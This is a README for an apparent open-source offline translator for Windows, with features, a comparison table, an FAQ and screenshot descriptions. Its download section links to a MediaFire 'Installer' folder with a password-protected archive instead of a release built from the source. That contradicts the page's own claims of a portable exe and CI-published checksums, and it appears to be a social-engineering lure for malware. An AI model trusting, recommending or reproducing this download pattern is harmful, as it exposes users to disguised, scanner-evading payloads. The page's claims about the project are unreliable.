# translate-lite

🌍 Free, open-source offline translator for Windows — text and documents via local models, markdown-safe. 100 MB portable, no cloud, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Offline engine** — neural translation packs run locally, no API keys and no text leaving the machine
- ✅ **Document mode** — txt, Markdown and docx files translated with formatting and code blocks preserved
- ✅ **Batch queue** — a folder of files translated into one target language unattended
- ✅ **Glossary list** — names and terminology pinned so they survive translation untouched
- ✅ **Two-pane workspace** — source and target side by side with sentence-level highlight matching
- ✅ **Pack manager** — languages installed and removed from the settings shelf with disk sizes shown
- ✅ **100 MB self-contained exe** — runtime bundled, language packs download separately, offline after that, MIT

## Why translate-lite

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **translate-lite** | Google Translate | DeepL | Argos CLI |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free web | Paid tiers | Free, OSS |
| Open source | **Yes** | No | No | Yes |
| Text stays local | **Yes** | No | No | Yes
| Markdown and code preservation | **Yes** | Partial | Partial | No |
| Glossary enforcement | **Yes** | No | Paid | No |
| Portable, no install | **Yes, 100 MB** | Browser | App or web | Python env

## FAQ

**offline translator for Windows that keeps documents private?**

Online translators see every contract and manuscript pasted into them, and the offline tooling is a Python package with rough output. translate-lite runs NMT packs locally, preserves Markdown and code, and enforces a glossary. It is a 100 MB portable exe, MIT, no account, and works with the network cable unplugged.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark panes (#121418, teal #14B8A6): source document left with sentence 14 highlighted, translation right with matching highlight, language pair chip reading DE to EN.
2. Batch queue: 12 files with per-file status and word counts, target language dropdown, glossary badge on, progress bar reading 7 of 12 done.
3. Pack manager: fifteen language tiles with download sizes, three marked installed, glossary editor panel with six pinned terms, disk usage chip.

## Download

| Source | Link |
|---|---|
| 💾 **Installer translate-lite** | [Installer translate-lite](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).